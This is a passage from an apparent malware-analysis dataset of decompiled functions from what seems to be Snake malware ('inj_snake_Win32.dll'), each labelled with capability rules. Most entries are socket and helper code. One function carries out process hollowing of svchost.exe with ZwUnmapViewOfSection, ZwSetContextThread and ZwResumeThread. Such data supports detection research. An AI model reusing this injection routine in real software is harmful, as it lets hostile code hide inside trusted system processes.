        "decompiled_code": "\nuint __cdecl fcn.2001a8ff(uint name, uint arg_ch, uint arg_10h, uint arg_14h, uchar *dest, int32_t *arg_1ch)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    *arg_1ch = 0;\n    *dest = 0;\n    puVar1 = (*_sym.imp.WS2_32.dll_gethostbyname)(name);\n    if (puVar1 == NULL) {\n        iVar2 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n        uVar3 = 0x2af9;\n        if (iVar2 != 0x2af9) {\n            if (iVar2 == 0x2afa) {\n                uVar3 = 0x2afa;\n            }\n            else if (iVar2 == 0x2afb) {\n                uVar3 = 0x2afb;\n            }\n        }\n    }\n    else {\n        if ((*(puVar1 + 2) == 2) && (*(puVar1 + 10) == 4)) {\n            for (piVar4 = puVar1[3]; *piVar4 != 0; piVar4 = piVar4 + 1) {\n                name = arg_ch;\n                iVar2 = fcn.2001a897();\n                *arg_1ch = iVar2;\n                if (iVar2 == 0) {\n                    return 8;\n                }\n                arg_1ch = iVar2 + 0x1c;\n            }\n        }\n        (*_sym.imp.ntdll.dll_strncpy)(dest, *puVar1, 0x400, name);\n        dest[0x400] = 0;\n        uVar3 = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 407
    },
    "2001ada3": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.2001ada3(int16_t *arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h, int32_t arg_18h, uint32_t arg_1ch, \n            uint32_t arg_20h)\n\n{\n    int16_t iVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    ushort uVar4;\n    int32_t *piVar5;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint uVar10;\n    uint var_ch;\n    ushort uStack12;\n    uint *var_4h;\n    \n    uVar9 = arg_20h;\n    var_ch = str.65535._0_4_;\n    uStack12 = str.65535._4_2_;\n    var_4h = &var_ch;\n    if ((arg_8h == NULL) || (arg_ch < 0x10)) {\ncode_r0x2001aefe:\n        uVar10 = 0x2afb;\n    }\n    else {\n        if (*arg_8h != 2) {\n            return 0x273f;\n        }\n        if (((arg_10h == 0) || (arg_14h == 0)) && ((arg_18h == 0 || (arg_1ch == 0)))) {\n            return 0x2af9;\n        }\n        uVar2 = arg_20h & 2;\n        if ((uVar2 != 0) && ((arg_20h & 4) != 0)) {\n            return 0x2726;\n        }\n        if ((arg_18h != 0) && (arg_1ch != 0)) {\n            iVar1 = arg_8h[1];\n            if (((arg_20h & 8) != 0) ||\n               ((piVar5 = (*_sym.imp.WS2_32.dll_getservbyport)(iVar1, -((arg_20h & 0x10) != 0) & 0x2002d98c), \n                piVar5 == NULL || (puVar3 = *piVar5,  *piVar5 == NULL)))) {\n                uVar4 = (*_sym.imp.WS2_32.dll_ntohs)(iVar1);\n                (*_sym.imp.ntdll.dll_sprintf)(&var_ch, 0x2002d52c, uVar4);\n                puVar3 = var_4h;\n            }\n            var_4h = puVar3;\n            uVar6 = sub.ntdll.dll_strlen(var_4h);\n            if (arg_1ch <= uVar6) goto code_r0x2001aefe;\n            sub.ntdll.dll_strcpy(arg_18h, var_4h);\n        }\n        if ((arg_10h != 0) && (arg_14h != 0)) {\n            arg_ch = *(arg_8h + 2);\n            if (uVar2 == 0) {\n                piVar5 = (*_sym.imp.WS2_32.dll_gethostbyaddr)(&arg_ch, 4, 2);\n                if ((piVar5 == NULL) || (iVar8 = *piVar5,  iVar8 == 0)) {\n                    if ((uVar9 & 4) != 0) {\n                        iVar8 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n                        if (iVar8 == 0x2af9) {\n                            return 0x2af9;\n                        }\n                        if (iVar8 == 0x2afa) {\n                            return 0x2afa;\n                        }\n                        if (iVar8 != 0x2afb) {\n                            return 0x2af9;\n                        }\n                        goto code_r0x2001aefe;\n                    }\n                    goto code_r0x2001af14;\n                }\n                if (((uVar9 & 1) != 0) && (puVar7 = (*_sym.imp.ntdll.dll_strchr)(iVar8, 0x2e),  puVar7 != NULL)) {\n                    *puVar7 = 0;\n                }\n            }\n            else {\ncode_r0x2001af14:\n                iVar8 = (*_sym.imp.WS2_32.dll_inet_ntoa)(arg_ch);\n            }\n            uVar9 = sub.ntdll.dll_strlen(iVar8);\n            if (arg_14h <= uVar9) goto code_r0x2001aefe;\n            sub.ntdll.dll_strcpy(arg_10h, iVar8);\n        }\n        uVar10 = 0;\n    }\n    return uVar10;\n}\n",
        "token_count": 1032
    },
    "2001d0c4": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001d0c4(int32_t arg_8h, uchar *arg_ch, int32_t *arg_10h, int32_t *arg_14h, uint32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint uVar4;\n    bool bVar5;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = in_EAX + 0x70;\n    var_8h = 0;\n    fcn.20001567(iVar1);\n    do {\n        if (*(in_EAX + 0xc) != 0) {\n            uVar4 = 0x21590006;\ncode_r0x2001d283:\n            fcn.2000157d(iVar1);\n            return uVar4;\n        }\n        if (*(in_EAX + 8) == 0) {\n            uVar4 = 0x21590003;\n            goto code_r0x2001d283;\n        }\n        if ((arg_8h == 1) && (*(in_EAX + 0x9c) != 0)) {\n            *arg_ch = *(in_EAX + 0x98);\n            *(in_EAX + 0x9c) = 0;\ncode_r0x2001d1c7:\n            uVar4 = 0;\n            goto code_r0x2001d283;\n        }\n        if ((arg_8h == 2) && (*(in_EAX + 0xa0) != 0)) {\n            *arg_10h = *(*(in_EAX + 0xa0) + 4) + 3;\n            *arg_14h = *(*(in_EAX + 0xa0) + 8) + -3;\n            piVar2 = *(in_EAX + 0xa0);\n            *(in_EAX + 0xa8) = *(in_EAX + 0xa8) - piVar2[2];\n            iVar3 = *piVar2;\n            (*_sym.imp.msvcrt.dll_free)(piVar2);\n            *(in_EAX + 0xa0) = iVar3;\n            if (iVar3 == 0) {\n                *(in_EAX + 0xa4) = 0;\n            }\n            if (*arg_14h == 0) {\n                fcn.2001c831();\n                *arg_10h = 0;\n            }\n            goto code_r0x2001d1c7;\n        }\n        bVar5 = *(in_EAX + 0x88) != 0;\n        if (bVar5) {\n            *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + 1;\n        }\n        else {\n            *(in_EAX + 0x88) = 1;\n        }\n        fcn.2000157d(iVar1);\n        if (!bVar5) {\n            uVar4 = fcn.2001ca98(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n            fcn.20001567(iVar1);\n            *(in_EAX + 0x88) = 0;\n            fcn.200012c9(in_EAX + 0x90);\n            goto code_r0x2001d283;\n        }\n        if (arg_18h == 0) {\n            uVar4 = 0x21590002;\n            goto code_r0x2001d283;\n        }\n        if (arg_18h != 0xffffffff) {\n            var_8h = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        }\n        iVar3 = fcn.200012d6(in_EAX + 0x90, arg_18h);\n        if (iVar3 == 0x102) {\n            uVar4 = 0x21590002;\n            fcn.20001567(iVar1);\n            *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + -1;\n            goto code_r0x2001d283;\n        }\n        if (arg_18h != 0xffffffff) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            if (arg_18h < iVar3 - var_8h) {\n                arg_18h = 0;\n            }\n            else {\n                arg_18h = arg_18h - (iVar3 - var_8h);\n            }\n        }\n        fcn.20001567(iVar1);\n        *(in_EAX + 0x8c) = *(in_EAX + 0x8c) + -1;\n    } while( true );\n}\n",
        "token_count": 1061
    },
    "200234f8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200234f8(uint src, uint32_t arg_ch, int32_t arg_10h, uint s1, uint32_t *arg_18h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    char *pcVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uchar *puVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint var_20h;\n    uint var_18h;\n    \n    pcVar8 = NULL;\n    if (arg_10h == 0) {\n        if (arg_ch < 0x81) {\n            sub.ntdll.dll_memcpy(s1, src, arg_ch);\n            *arg_18h = arg_ch;\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = 0x215900c8;\n        }\n    }\n    else {\n        pcVar3 = (*_sym.imp.msvcrt.dll__strdup)(src);\n        pcVar1 = _sym.imp.ntdll.dll_strrchr;\n        if (pcVar3 == NULL) {\n            uVar2 = 0x21590004;\n        }\n        else {\n            iVar4 = (*_sym.imp.ntdll.dll_strrchr)(pcVar3, 0x5d);\n            pcVar5 = pcVar3;\n            if (iVar4 != 0) {\n                pcVar5 = (*pcVar1)(pcVar3, 0x5d, 0x3a);\n            }\n            puVar6 = (*pcVar1)(pcVar5);\n            if (puVar6 == NULL) {\n                iVar4 = (*_sym.imp.ntdll.dll_isalpha)(*pcVar3);\n                if (((iVar4 != 0) || (*pcVar3 == '[')) ||\n                   (iVar4 = (*_sym.imp.ntdll.dll_strchr)(pcVar3, 0x2e),  pcVar5 = pcVar3,  iVar4 != 0)) {\n                    pcVar8 = pcVar3;\n                    pcVar5 = NULL;\n                }\n            }\n            else {\n                *puVar6 = 0;\n                pcVar8 = pcVar3;\n                pcVar5 = puVar6 + 1;\n            }\n            sub.ntdll.dll_memset(&var_20h, 0, 0x20);\n            var_18h = 1;\n            var_20h = 1;\n            iVar7 = fcn.200234ab(pcVar8, pcVar5, &var_20h, &arg_10h);\n            iVar4 = arg_10h;\n            if (iVar7 == 0) {\n                for (; iVar4 != 0; iVar4 = *(iVar4 + 0x1c)) {\n                    sub.ntdll.dll_memcpy(s1, *(iVar4 + 0x18), *(iVar4 + 0x10));\n                    *arg_18h = *(iVar4 + 0x10);\n                    if (((*(iVar4 + 4) == 2) && (*pcVar3 != '[')) || ((*(iVar4 + 4) == 0x17 && (*pcVar3 == '['))))\n                    break;\n                }\n                fcn.200234e1(arg_10h);\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = 0x215900c8;\n            }\n            (*_sym.imp.msvcrt.dll_free)(pcVar3);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 760
    },
    "20023632": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.20023632(int32_t arg_8h, int32_t *arg_ch, int32_t *arg_10h, uint32_t size, int16_t *arg_18h)\n\n{\n    int32_t *piVar1;\n    int16_t *piVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint readfds;\n    int32_t var_108h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    iVar6 = arg_8h;\n    if (size == 0xffffffff) {\n        puVar3 = NULL;\n    }\n    else {\n        var_8h = size / 1000;\n        var_4h = (size % 1000) * 1000;\n        puVar3 = &var_8h;\n    }\n    var_108h = arg_8h;\n    readfds = 1;\n    iVar4 = (*_sym.imp.WS2_32.dll_select)(arg_8h + 1, &readfds, 0, 0, puVar3);\n    if (iVar4 == 0) {\n        uVar5 = 0x21590002;\n    }\n    else if ((iVar4 == -1) || (iVar4 = (*_sym.imp.WS2_32.dll_ioctlsocket)(iVar6, 0x4004667f, &size),  iVar4 == -1)) {\n        uVar5 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n    }\n    else {\n        iVar4 = (*_sym.imp.msvcrt.dll_malloc)(size);\n        piVar2 = arg_18h;\n        piVar1 = arg_ch;\n        *arg_ch = iVar4;\n        if (iVar4 == 0) {\n            uVar5 = 0xc;\n        }\n        else {\n            if (arg_18h == NULL) {\n                iVar6 = (*_sym.imp.WS2_32.dll_recv)(iVar6, iVar4, size, 0);\n            }\n            else {\n                arg_8h = 0x80;\n                sub.ntdll.dll_memset(arg_18h, 0, 0x80);\n                iVar6 = (*_sym.imp.WS2_32.dll_recvfrom)(iVar6, *piVar1, size, 0, piVar2, &arg_8h);\n            }\n            if (iVar6 == -1) {\n                (*_sym.imp.msvcrt.dll_free)(*piVar1);\n                *piVar1 = 0;\n                uVar5 = (*_sym.imp.WS2_32.dll_WSAGetLastError)();\n            }\n            else {\n                *arg_10h = iVar6;\n                if (((piVar2 != NULL) && (*piVar2 == 2)) && (arg_8h == 0x10)) {\n                    sub.ntdll.dll_memset(piVar2 + 4, 0, 8);\n                }\n                uVar5 = 0;\n            }\n        }\n    }\n    return uVar5;\n}\n",
        "token_count": 681
    },
    "200272a8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.200272a8(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    while (pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA,  *0x20047164 == 1) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10);\n    }\n    if (*0x20047164 != 2) {\n        *0x20047164 = 1;\n        iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x20047160, 0, 0, 1, 0xf0000000);\n        if ((iVar2 == 0) && (iVar2 = (*pcVar1)(0x20047160, 0, 0, 1, 0xf0000008),  iVar2 == 0)) {\n            *0x20047164 = 0;\n            return 0;\n        }\n        *0x20047164 = 2;\n        return 1;\n    }\n    return 1;\n}\n",
        "token_count": 234
    },
    "2000611f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.2000611f(void)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    iVar1 = sym.inj_snake_Win32.dll_qm_enum(0xffffffff, 1, &var_10h, &var_14h);\n    if (iVar1 == 0) {\n        var_4h = 0;\n        if (var_10h != 0) {\n            do {\n                var_8h = 0;\n                do {\n                    iVar1 = fcn.20005ccc();\n                    if (iVar1 != 0) break;\n                    var_8h = var_8h + 1;\n                } while (var_8h < 3);\n                var_4h = var_4h + 1;\n            } while (var_4h < var_10h);\n        }\n        sym.inj_snake_Win32.dll_qm_free(var_14h);\n        if (var_ch != 0) {\n            sym.inj_snake_Win32.dll_t_close(&var_ch, 0);\n        }\n    }\n    else {\n        sym.inj_snake_Win32.dll_snake_log(4, 0, iVar1 + 0x191U | 0x21590000, 0, 0);\n    }\n    return;\n}\n",
        "token_count": 328
    },
    "2000e86a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: ptr\n\nvoid __cdecl fcn.2000e86a(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t *arg_18h_00;\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    int32_t *piVar5;\n    uint var_50ch;\n    uint var_45ch;\n    uint lpBuffer;\n    uint var_38h;\n    uint var_34h;\n    uint n;\n    uint var_2ch;\n    uint ptr;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.20011888(0x20032438, 0x4fc);\n    *(unaff_EBP + -0x28) = 0;\n    *(unaff_EBP + -0x20) = 0;\n    if (((*(unaff_EBP + 0x14) == 0) || (arg_18h_00 = *(unaff_EBP + 0x18),  arg_18h_00 == NULL)) ||\n       (iVar4 = *(unaff_EBP + 8),  iVar4 == 0)) goto code_r0x2000ec6c;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.2000dd43(iVar4, 0);\n    if ((iVar2 == 0) && (iVar2 = *(iVar4 + 0x3c) + iVar4,  *(unaff_EBP + -0x34) = iVar2,  *(iVar2 + 0x5c) == 3)) {\n        iVar2 = fcn.2000d849(0xffffffff, unaff_EBP + -0x21);\n        *(unaff_EBP + -0x1c) = iVar2;\n        if (iVar2 != 0) goto code_r0x2000e8c9;\n        if (*(unaff_EBP + -0x21) != '\\0') {\n            *(unaff_EBP + -0x1c) = 0x21590001;\n            goto code_r0x2000e8c9;\n        }\n        uVar3 = fcn.2000dbc8(iVar4);\n        *(unaff_EBP + -0x30) = uVar3;\n        iVar2 = (*_sym.imp.msvcrt.dll_malloc)(uVar3);\n        *(unaff_EBP + -0x28) = iVar2;\n        if (iVar2 == 0) {\ncode_r0x2000e91c:\n            *(unaff_EBP + -0x1c) = 0x21590004;\n            goto code_r0x2000e8c9;\n        }\n        sub.ntdll.dll_memset(iVar2, 0, *(unaff_EBP + -0x30));\n        iVar4 = fcn.2000dc1f(*(unaff_EBP + -0x28), iVar4);\n        *(unaff_EBP + -0x1c) = iVar4;\n        if (iVar4 != 0) goto code_r0x2000e8c9;\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(unaff_EBP + -0x240, 0x104);\n        if (iVar4 == 0) {\n            *(unaff_EBP + -0x1c) = 0xffffffff;\n            goto code_r0x2000e8c9;\n        }\n        iVar4 = (*_sym.imp.ntdll.dll_wcslen)(unaff_EBP + -0x240);\n        (*_sym.imp.ntdll.dll_wcsncat)(unaff_EBP + -0x240, L\"\\\\svchost.exe\", 0x104 - iVar4);\n        iVar4 = fcn.2000e156(unaff_EBP + -0x240, *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14), \n                             arg_18h_00, unaff_EBP + -0x50c);\n        *(unaff_EBP + -0x1c) = iVar4;\n        if (iVar4 != 0) goto code_r0x2000e8c9;\n        iVar4 = fcn.2000e856(*arg_18h_00, unaff_EBP + -0x2c);\n        *(unaff_EBP + -0x1c) = iVar4;\n        if (iVar4 != 0) goto code_r0x2000e8c9;\n        iVar2 = *(unaff_EBP + -0x2c) + 8;\n        iVar4 = fcn.2000d8f1(*arg_18h_00, iVar2, 0, unaff_EBP + -0x38, 4);\n        *(unaff_EBP + -0x1c) = iVar4;\n        if (iVar4 != 0) goto code_r0x2000e8c9;\n        iVar4 = (*_sym.imp.ntdll.dll_ZwUnmapViewOfSection)(*arg_18h_00, *(unaff_EBP + -0x38));\n        if (iVar4 == 0) {\n            *(unaff_EBP + -0x20) = *(*(unaff_EBP + -0x34) + 0x34);\n            iVar4 = (*_sym.imp.ntdll.dll_ZwAllocateVirtualMemory)\n                              (*arg_18h_00, unaff_EBP + -0x20, 0, unaff_EBP + -0x30, 0x3000, 0x40);\n            if (iVar4 != 0) {\n                *(unaff_EBP + -0x20) = 0;\n            }\n        }\n        if (*(unaff_EBP + -0x20) == 0) {\n            iVar4 = (*_sym.imp.ntdll.dll_ZwAllocateVirtualMemory)\n                              (*arg_18h_00, unaff_EBP + -0x20, 0, unaff_EBP + -0x30, 0x2000, 0x40);\n            if ((iVar4 != 0) ||\n               (iVar4 = (*_sym.imp.ntdll.dll_ZwAllocateVirtualMemory)\n                                  (*arg_18h_00, unaff_EBP + -0x20, 0, unaff_EBP + -0x30, 0x1000, 0x40),  iVar4 != 0))\n            goto code_r0x2000e91c;\n            iVar4 = fcn.2000daee(*(unaff_EBP + -0x28), *(unaff_EBP + -0x20));\n            *(unaff_EBP + -0x1c) = iVar4;\n            if (iVar4 != 0) goto code_r0x2000e8c9;\n        }\n        *(unaff_EBP + -0x1c) = 0x21590064;\n        iVar4 = fcn.2000d909(*arg_18h_00, iVar2, 0, unaff_EBP + -0x20, 4);\n        *(unaff_EBP + -0x1c) = iVar4;\n        if (iVar4 != 0) goto code_r0x2000e8c9;\n        iVar4 = *(unaff_EBP + -0x28);\n        iVar2 = *(iVar4 + 0x3c) + iVar4;\n        *(iVar2 + 0x34) = *(unaff_EBP + -0x20);\n        iVar4 = fcn.2000d909(*arg_18h_00, *(unaff_EBP + -0x20), 0, iVar4, *(unaff_EBP + -0x30));\n        *(unaff_EBP + -0x1c) = iVar4;\n        if (iVar4 != 0) goto code_r0x2000e8c9;\n        *(unaff_EBP + -0x45c) = *(iVar2 + 0x28) + *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x50c) = 0x10002;\n        iVar4 = (*_sym.imp.ntdll.dll_ZwSetContextThread)(arg_18h_00[1], unaff_EBP + -0x50c);\n        if (iVar4 != 0) {\ncode_r0x2000eafb:\n            *(unaff_EBP + -0x1c) = 0x21590064;\n            goto code_r0x2000e8c9;\n        }\n        iVar4 = *(unaff_EBP + 0x14);\n        if ((*(iVar4 + 0x2c) & 0x100) == 0) goto code_r0x2000ec06;\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n        iVar2 = fcn.2000d8f1(*arg_18h_00, *(unaff_EBP + -0x2c) + 0x10, 0, unaff_EBP + -0x2c, 4);\n        *(unaff_EBP + -0x1c) = iVar2;\n        if (iVar2 != 0) goto code_r0x2000e8c9;\n        piVar5 = iVar4 + 0x40;\n        if (*piVar5 != 0) {\n            iVar4 = (*_sym.imp.ntdll.dll_ZwDuplicateObject)(0xffffffff, *piVar5, *arg_18h_00, piVar5, 0, 0, 2);\n            if (iVar4 == 0) {\n                iVar4 = fcn.2000d909(*arg_18h_00, *(unaff_EBP + -0x2c) + 0x20, 0, piVar5, 4);\n                *(unaff_EBP + -0x1c) = iVar4;\n                if (iVar4 == 0) goto code_r0x2000eb7e;\n            }\n            goto code_r0x2000e8c9;\n        }\ncode_r0x2000eb7e:\n        piVar5 = *(unaff_EBP + 0x14) + 0x38;\n        if (*piVar5 != 0) {\n            iVar4 = (*_sym.imp.ntdll.dll_ZwDuplicateObject)(0xffffffff, *piVar5, *arg_18h_00, piVar5, 0, 0, 2);\n            if (iVar4 == 0) {\n                iVar4 = fcn.2000d909(*arg_18h_00, *(unaff_EBP + -0x2c) + 0x18, 0, piVar5, 4);\n                *(unaff_EBP + -0x1c) = iVar4;\n                if (iVar4 == 0) goto code_r0x2000ebc2;\n            }\n            goto code_r0x2000e8c9;\n        }\ncode_r0x2000ebc2:\n        piVar5 = *(unaff_EBP + 0x14) + 0x3c;\n        if (*piVar5 != 0) {\n            iVar4 = (*_sym.imp.ntdll.dll_ZwDuplicateObject)(0xffffffff, *piVar5, *arg_18h_00, piVar5, 0, 0, 2);\n            if (iVar4 == 0) {\n                iVar4 = fcn.2000d909(*arg_18h_00, *(unaff_EBP + -0x2c) + 0x1c, 0, piVar5, 4);\n                *(unaff_EBP + -0x1c) = iVar4;\n                if (iVar4 == 0) goto code_r0x2000ec06;\n            }\n            goto code_r0x2000e8c9;\n        }\ncode_r0x2000ec06:\n        iVar4 = (*_sym.imp.ntdll.dll_ZwResumeThread)(arg_18h_00[1], 0);\n        if (iVar4 != 0) goto code_r0x2000eafb;\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x1c) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x1c) = 0x21590065;\ncode_r0x2000e8c9:\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    if (*(unaff_EBP + -0x28) != 0) {\n        (*_sym.imp.msvcrt.dll_free)(*(unaff_EBP + -0x28));\n    }\n    if ((*(unaff_EBP + -0x1c) != 0) && (*arg_18h_00 != 0)) {\n        (*_sym.imp.ntdll.dll_ZwTerminateProcess)(*arg_18h_00, 0);\n        pcVar1 = _sym.imp.ntdll.dll_ZwClose;\n        (*_sym.imp.ntdll.dll_ZwClose)(*arg_18h_00);\n        (*pcVar1)(arg_18h_00[1]);\n    }\ncode_r0x2000ec6c:\n    fcn.200118c3();\n    return;\n}\n",
        "token_count": 3060
    },
    "2001a85a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint fcn.2001a85a(int32_t *param_1)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    cVar1 = *param_1;\n    iVar3 = 0;\n    piVar2 = param_1;\n    if (cVar1 != '\\0') {\n        do {\n            if (cVar1 == '.') {\n                iVar3 = iVar3 + 1;\n            }\n            piVar2 = piVar2 + 1;\n            cVar1 = *piVar2;\n        } while (cVar1 != '\\0');\n        if ((iVar3 == 3) && (iVar3 = (*_sym.imp.WS2_32.dll_inet_addr)(param_1),  iVar3 != -1)) {\n            *param_1 = iVar3;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 200
    },
    "2001c9e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.2001c9e4(uint noname_0, uint arg_ch, uint32_t arg_10h)\n\n{\n    if (2 < arg_10h) {\n        sub.ntdll.dll_memcpy(&arg_10h, arg_ch, 3);\n        arg_10h._1_1_ = arg_10h._1_1_ ^ arg_10h._2_1_ >> 1;\n        if ((((arg_10h._1_1_ & 0x40) == 0) && ((arg_10h._1_1_ & 1) != 0)) && ((arg_10h._1_1_ & 4) == 0)) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 171
    },
    "200222bd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nuint __cdecl fcn.200222bd(int32_t arg_8h, int32_t arg_ch, int32_t *arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    ushort uVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint var_28h;\n    uint var_10h;\n    ushort var_ch;\n    ushort uStack14;\n    \n    iVar5 = arg_ch;\n    if ((arg_ch == 4) || (arg_ch == 3)) {\n        uVar3 = (*_sym.imp.WS2_32.dll_ntohs)(*(arg_8h + 10));\n        uVar4 = (*_sym.imp.WS2_32.dll_inet_ntoa)(*(arg_8h + 0xc), uVar3);\n        (*_sym.imp.ntdll.dll_sprintf)(&var_28h, \"%s:%u\", uVar4);\n        if (iVar5 == 3) goto code_r0x20022390;\n    }\n    else {\n        if ((arg_ch != 0xd) && (arg_ch != 0xc)) {\n            return 0x21590001;\n        }\n        arg_ch = 0x10;\n        (*_sym.imp.WS2_32.dll_getsockname)(*(arg_8h + 4), &var_10h, &arg_ch);\n        uVar3 = (*_sym.imp.WS2_32.dll_ntohs)(CONCAT22(var_ch, var_10h._2_2_));\n        uVar4 = (*_sym.imp.WS2_32.dll_inet_ntoa)(CONCAT22(uStack14, var_ch), uVar3);\n        (*_sym.imp.ntdll.dll_sprintf)(&var_28h, \"%s:%u\", uVar4);\n        if (iVar5 == 0xc) {\ncode_r0x20022390:\n            if (arg_14h == 4) {\n                iVar5 = sub.ntdll.dll_strlen(&var_28h);\n                *arg_10h = iVar5 + 1;\n                return 0;\n            }\n            return 0x21590064;\n        }\n    }\n    uVar2 = arg_14h;\n    if (0 < arg_14h) {\n        iVar5 = sub.ntdll.dll_strlen(&var_28h);\n        piVar1 = arg_10h;\n        if (uVar2 < iVar5 + 1U) {\n            (*_sym.imp.ntdll.dll_strncpy)(arg_10h, &var_28h, uVar2 - 1);\n            *(piVar1 + (uVar2 - 1)) = 0;\n        }\n        else {\n            sub.ntdll.dll_strcpy(arg_10h, &var_28h);\n        }\n        return 0;\n    }\n    return 0x21590064;\n}\n",
        "token_count": 637
    },
    "2002380e": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.2002380e(char *arg_8h)\n\n{\n    char *pcVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint8_t uVar4;\n    char cVar5;\n    uint8_t uVar6;\n    char *pcVar7;\n    \n    pcVar1 = arg_8h;\n    do {\n        uVar6 = 0;\n        arg_8h = 0x8;\n        pcVar2 = pcVar1;\n        do {\n            pcVar7 = pcVar2;\n            iVar3 = fcn.200018bf();\n            uVar4 = iVar3 % 0x3e;\n            if (uVar4 < 10) {\n                cVar5 = uVar4 + 0x30;\n            }\n            else if (uVar4 - 10 < 0x1a) {\n                cVar5 = uVar4 + 0x37;\n            }\n            else {\n                cVar5 = uVar4 + 0x3d;\n            }\n            uVar6 = uVar6 + cVar5;\n            *pcVar7 = cVar5;\n            arg_8h = arg_8h + -1;\n            pcVar2 = pcVar7 + 1;\n        } while (arg_8h != NULL);\n    } while ((((*pcVar1 == 